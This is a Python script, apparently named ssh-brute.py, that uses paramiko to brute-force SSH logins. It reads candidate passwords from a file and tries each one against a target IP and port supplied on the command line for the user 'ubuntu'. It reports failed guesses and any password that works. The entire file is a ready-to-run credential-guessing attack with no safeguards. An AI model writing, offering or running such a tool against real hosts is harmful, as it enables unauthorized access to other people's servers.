import paramiko, sys, os, socket

def ssh_connect(username, password, host, port, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=port, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code

def start_ssh_brute_force_attack(username, targetIP, targetPort, password_file):
    if not os.path.exists(password_file):
        print(f"Password file does not exist: {password_file}")
        return False
    print(f"Target address: {targetIP}")
    print(f"Target port: {targetPort}")
    print(f"SSH username: {username}")
    print(f"Password file: {password_file}")
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()
            try:
                response = ssh_connect(username,password,targetIP, targetPort)
                if response == 0:
                    print('[+] Found Password: ' + password + ' ,For Account: ' + username)
                    break
                elif response == 1:
                    print('[-] Incorrect Login: ' + password)
                elif response == 2:
                    print('[!!] Can Not Connect')
                    sys.exit(1)
            except Exception as e:
                print(e)
                pass

if __name__ == '__main__':
  username = "ubuntu"
  password_file = os.path.join(sys.path[0], "passwords.txt")
  # attackID, iface, targetIP, targetPort=None
  argv_len = len(sys.argv)
  if  argv_len < 2:
    print("Invalid input arguments")
    print("python ssh-brute.py <targetIP> [targetPort]")
  elif argv_len == 2:
    ret = start_ssh_brute_force_attack(username,sys.argv[1], 22, password_file)
    print(f"Attack result: {ret}")
  else:
    ret = start_ssh_brute_force_attack(username,sys.argv[1],sys.argv[2], password_file)
    print(f"Attack result: {ret}")
